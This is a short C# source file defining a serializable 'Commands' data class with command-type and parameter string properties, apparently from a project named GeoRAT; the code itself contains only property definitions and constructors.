using System;


namespace GeoRAT.Core.Commands
{
   

    [Serializable]
    public class Commands
    {
        public string CommandType { get; set; }
        public string CommandParams { get;  set; }

        public Commands(string CommandType, string CommandParams)
        {
            this.CommandType = CommandType;
            this.CommandParams = CommandParams;
        }

        public Commands()
        {

        }
      


    }

}


